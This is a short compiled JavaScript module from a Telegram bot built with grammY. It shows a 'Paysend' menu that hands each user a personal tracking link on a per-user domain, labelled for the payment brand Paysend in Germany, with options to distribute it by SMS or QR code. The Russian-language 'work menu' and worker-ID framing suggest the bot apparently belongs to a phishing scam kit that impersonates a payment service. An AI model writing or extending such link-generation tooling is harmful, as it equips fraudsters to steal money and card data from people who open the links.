"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
exports.handler = exports.composer = void 0;
const grammy_1 = require("grammy");
const getDomen_1 = require("../../../helpers/getDomen");
exports.composer = new grammy_1.Composer();
exports.composer.callbackQuery('paysend menu', handler);
const keyboard = new grammy_1.InlineKeyboard()
    .text("📲 SMS", `sms ad paysend`)
    .text("🎲 QR-code", `qrcode get paysend`)
    .row()
    .text('Назад', 'workMenu2.0');
async function handler(ctx) {
    const domen = await (0, getDomen_1.getDomen)(ctx.user, 'paysend');
    if (!domen)
        return ctx.reply('domen undefined error');
    return ctx.editMessageCaption({
        caption: `
🆔 <b>Твой ID paysand: <code>${ctx.user.id}</code></b>
💡 <b>Платформа: [PAYSEND 🇩🇪]</b>

➖➖➖➖➖➖➖
🌠 <b>Твоя уникальная ссылка:</b> <a href="https://${domen.link}/link/paysend/${ctx.user.id}">LINK</a>
        `,
        reply_markup: keyboard
    });
}
exports.handler = handler;
